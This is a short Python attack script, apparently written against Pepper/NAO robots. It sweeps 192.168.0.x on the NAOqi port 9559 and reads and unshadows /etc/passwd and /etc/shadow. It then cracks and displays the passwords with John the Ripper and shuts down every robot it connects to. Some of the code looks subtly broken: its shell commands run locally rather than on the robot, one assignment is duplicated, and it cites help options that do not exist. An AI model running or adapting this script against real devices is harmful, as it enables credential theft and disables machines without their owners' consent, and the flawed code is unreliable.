#!/usr/bin/python
import os
import sys
import qi

"""
You have to cross compile and copy John the ripper to the pepper robot first. This option is not explained in detail for security issues.
"""

if __name__ == "__main__":

    ip_range = "192.168.0."

    for ip in range(0,256):
        ip_addr = ip_range + str(ip)
        print("trying to connect to: " + ip_addr)

        session = qi.Session()
        try:
            session.connect("tcp://" + ip_addr + ":" + str(9559))
            #copy john to nao
            os.chdir("/home/nao")
            os.system("unshadow /etc/passwd /etc/shadow > /home/nao/mypasswd.txt")
            os.system("/usr/bin/john --single mypasswd.txt")
            os.system("/usr/bin/john --incremental /home/nao/mypasswd.txt")
            os.system("/usr/bin/john --show /home/nao/mypasswd.txt")
            os.remove("/home/nao/mypasswd.txt")
            #os.remove("/usr/bin/john")
            system_service = system_service = session.service("ALSystem")
            system_service.shutdown()
        except RuntimeError:
            print ("Can't connect to Naoqi at ip \"" + ip_addr + "\" on port " + str(9559) +".\n"
                   "Please check your script arguments. Run with -h option for help.")
